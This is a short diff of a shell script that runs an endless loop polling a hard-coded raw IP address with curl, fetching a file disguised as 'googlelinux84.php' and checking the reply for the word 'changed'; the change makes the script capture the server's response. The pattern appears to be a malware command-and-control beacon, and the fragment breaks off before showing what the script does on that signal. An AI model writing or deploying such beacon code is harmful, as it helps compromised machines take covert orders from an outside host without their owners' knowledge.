@@ -1,7 +1,7 @@
 while true
 do
 
-string8474=$(curl -s http://154.127.52.52/googlelinux84.php | cat &> /dev/null &)
+string8474=$(curl -s http://154.127.52.52/googlelinux84.php | cat)
 
 if [[ $string8474 == *"changed"* ]]; then
 
